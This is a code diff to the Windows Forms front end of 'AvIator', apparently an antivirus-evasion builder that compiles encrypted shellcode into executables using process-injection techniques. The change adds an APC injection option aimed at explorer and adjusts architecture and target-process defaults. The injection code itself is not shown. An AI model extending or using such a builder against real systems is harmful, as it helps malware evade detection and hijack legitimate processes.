@@ -72,6 +72,7 @@ namespace AvIator
             VirtualAllocTech virtualAllocT = null;
             VirtualAllocExTech virtualAllocExT = null;
             VirtualAllocEx_existing_APP_Tech virtualAllocEx_existing = null;
+            APCInjecionX64 apcInjectionX64 = null;
 
             if (archX64.Checked)
                 architecture = " /platform:x64 /optimize";
@@ -90,7 +91,7 @@ namespace AvIator
                 else
                     if (virtualAllocEx_Option.Checked)
                 {
-                    procBox.Text = "notepad.exe(32)";
+                    procBox.Text = "notepad.exe (32)";
                     virtualAllocExT = new VirtualAllocExTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                     compiler.compileToExe(virtualAllocExT.GetCode(), keyBox.Text, filepath, architecture);
                 }
@@ -102,17 +103,24 @@ namespace AvIator
                 }
                 else if (threadHijacking_option.Checked)
                 {
-                    procBox.Enabled = true;
-                    
+
                     thrHijacking = new ThreadHijacking(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                     compiler.compileToExe(thrHijacking.GetCode(), keyBox.Text, filepath, architecture);
                 }
                 else if(threadHijackin_x86.Checked)
                 {
-                    procBox.Text = "notepad.ex(32)";
+                    procBox.Enabled = false;
+                    procBox.Text = "notepad.exe (32)";
                     thrHijackingx86 = new ThreadHijackingX86(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
                     compiler.compileToExe(thrHijackingx86.GetCode(), keyBox.Text, filepath, architecture);
 
+
+                }
+                else if (APCInjectionCheckBox.Checked)
+                {
+                    procBox.Enabled = true;
+                    apcInjectionX64 = new APCInjecionX64(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
+                    compiler.compileToExe(apcInjectionX64.GetCode(), keyBox.Text, filepath, architecture);
 
                 }
                 MessageBox.Show("The operation completed successfully", "AV/\tor");
@@ -170,6 +178,7 @@ namespace AvIator
 
         private void virtualAllocEx_Option_CheckedChanged(object sender, EventArgs e)
         {
+            archX86.Checked = true;
             if (virtualAllocEx_Option.Checked)
                 procBox.Text = "notepad.exe (32)";
             else if (virtualAlloc_Option.Checked)
@@ -192,6 +201,7 @@ namespace AvIator
 
         private void threadHijackin_x86_CheckedChanged(object sender, EventArgs e)
         {
+            archX86.Checked = true;
             procBox.Text = "notepad.exe (32)";
         }
 
@@ -221,6 +231,13 @@ namespace AvIator
                 iconfile = openFileDlg.FileName;
 
 
+        }
+
+        private void APCInjectionCheckBox_CheckedChanged(object sender, EventArgs e)
+        {
+            archX64.Checked = true;
+            procBox.Text = "explorer";
+            procBox.Enabled = true;
         }
     }
 }
